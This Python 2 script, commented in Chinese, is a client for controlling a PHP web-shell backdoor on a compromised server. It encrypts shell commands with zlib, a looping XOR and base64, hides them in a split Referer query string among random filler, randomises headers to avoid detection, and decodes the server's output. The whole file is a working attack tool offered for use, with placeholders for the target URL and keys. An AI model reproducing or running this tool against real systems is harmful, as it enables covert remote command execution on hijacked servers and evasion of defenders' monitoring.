# encoding: utf-8
# 注意修改 url , keyh , keyf 等参数

from random import randint,choice
from hashlib import md5
import urllib
import string
import zlib
import base64
import requests
import re

# 用于生成完整的 Accept-Language
def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []    # 结果
    indexes = []    # 索引
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

# 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )
def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

# 生成随机填充字符串( 由所有大小写字母组成 )
def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        # choice() 方法返回一个列表，元组或字符串的随机项
        # string.ascii_letters 会生成所有的字母
        result += choice(string.ascii_letters)
    return result

# 模拟 x() 函数 , 循环异或加密
def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result

# 开启 Debug 选项
def debugPrint(msg):
    if debugging:
        print msg

# 定义基本变量
debugging = False    # 默认关闭 Debug , 可用 True 开启
keyh = "42f7"    # $kh , 需要修改
keyf = "e9ac"    # $kf , 需要修改
xorKey = keyh + keyf    # $k
url = 'http://localhost/test.php'    # 指定 URL  , 需要修改
defaultLang = 'zh-CN'    #默认Language
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']    #Accept-Language 模板
proxies = None    # {'http':'http://127.0.0.1:8080'} # 代理 , 可用于 BurpSuite 等
sess = requests.Session()    # 创建一个 SESSION 对象

# 每次会话会产生一次随机的 Accept-Language
langTmp = choicePart(languages,3)    # 输出一个列表 , 包含模板中的三种 Accept-language
indexes = sorted(choicePart(range(1,10),3), reverse=True)    # 降序排序输出三个权重值 , 例如 [8,6,4]

acceptLang = [defaultLang]   # 先添加默认Language
for i in xrange(3):
    acceptLang.append(langTmp[i] % (indexes[i],))    # 然后循环添加三种 Accept-Language , 并为其添加权重值
acceptLangStr = ','.join(acceptLang)    # 将多个 Accept-Language 用 " , " 拼接在一起
# acceptLangStr 即为要使用的 Accept-Language
debugPrint(acceptLangStr)

init2Char = acceptLang[0][0] + acceptLang[1][0]    # $i
md5head = (md5(init2Char + keyh).hexdigest())[0:3]    # $h
md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))    # $f + 填充字符串
debugPrint('$i is %s' % (init2Char))
debugPrint('md5 head: %s' % (md5head,))
debugPrint('md5 tail: %s' % (md5tail,))

# 交互式 Shell
cmd = "system('" + raw_input('shell > ') + "');"
while cmd != '':
    # 在写入 Payload 前填充一些无关数据
    query = []
    for i in xrange(max(indexes)+1+randint(0,2)):
        key = randAlpha(randint(3,6))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
        query.append((key, value))    # 生成无关数据并填充
    debugPrint('Before insert payload:')
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    # 对 Payload 进行加密
    payload = zlib.compress(cmd)    # gzcompress 操作
    payload = loopXor(payload,xorKey)    # 循环异或运算 , PHP代码中的 x() 函数
    payload = base64.urlsafe_b64encode(payload)    # base64_encode 编码
    payload = md5head + payload    #    在开头补全$h

    #  对Payload进行修改
    cutIndex = randint(2,len(payload)-3)
    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
    iPiece = 0
    for i in indexes:
        query[i] = (query[i][0],payloadPieces[iPiece])
        iPiece += 1
    # 将 Payload 作为查询字符串编码拼接到 Referer 中
    referer = url + '?' + urllib.urlencode(query)
    debugPrint('After insert payload, referer is:')
    debugPrint(query)
    debugPrint(referer)

    # 发送 HTTP GET 请求
    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
    html = r.text
    debugPrint(html)

    # 接收响应数据包
    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
    output = pattern.findall(html)
    # 如果没有收到响应数据包
    if len(output) == 0:
        print 'Error,  no backdoor response'
        cmd = "system('" + raw_input('shell > ') + "');"
        continue
    # 如果收到响应数据包 , 则对其进行处理
    output = output[0]
    debugPrint(output)
    output = output.decode('base64')    # base64_decode 解码
    output = loopXor(output,xorKey)    # 循环异或运算
    output = zlib.decompress(output)   # gzuncompress 运算
    print output    # 输出响应信息
    cmd = "system('" + raw_input('shell > ') + "');"
